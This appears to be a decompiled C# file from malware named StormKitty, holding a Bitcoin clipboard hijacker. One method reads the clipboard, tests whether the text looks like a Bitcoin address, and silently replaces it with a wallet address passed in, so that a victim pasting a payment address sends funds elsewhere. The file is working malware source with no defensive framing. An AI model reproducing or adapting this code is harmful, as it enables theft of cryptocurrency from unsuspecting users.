using System;
using System.Threading;
using System.Windows.Forms;

namespace StormKitty
{
	// Token: 0x02000043 RID: 67
	internal class Bitcoin
	{
		// Token: 0x0600011B RID: 283 RVA: 0x00009604 File Offset: 0x00007804
		[STAThread]
		public static void Clip(string wallet)
		{
			Thread.Sleep(10);
			string text = Clipboard.GetText();
			if (Bitcoin.Clipregex(text) && text != wallet)
			{
				Clipboard.SetText(wallet);
			}
		}

		// Token: 0x0600011C RID: 284 RVA: 0x00009635 File Offset: 0x00007835
		private static bool Clipregex(string clipboard)
		{
			return (clipboard.Length >= 26 && clipboard.Length <= 42 && clipboard.StartsWith("1")) || clipboard.StartsWith("3") || clipboard.StartsWith("bc1");
		}
	}
}
